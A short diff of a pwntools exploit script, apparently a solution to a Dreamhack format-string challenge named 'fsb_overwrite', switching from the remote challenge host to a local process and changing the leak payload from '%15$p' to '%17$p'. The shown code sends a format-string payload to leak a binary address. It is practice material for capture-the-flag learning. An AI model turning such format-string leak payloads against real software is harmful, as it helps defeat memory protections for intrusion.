@@ -1,8 +1,8 @@
 from pwn import *
 
 exe = ELF('./fsb_overwrite', checksec=False)
-# p = process(exe.path)
-p = remote("host1.dreamhack.games", 23680)
+p = process(exe.path)
+# p = remote("host1.dreamhack.games", 23680)
 
 input()
 
@@ -13,7 +13,7 @@ input()
 # -> 15
 
 # Leak exe
-payload = b'%15$p'
+payload = b'%17$p'
 p.sendline(payload)
 leak = p.recvuntil(b'\n')
 leak = int(leak.decode(), 16)
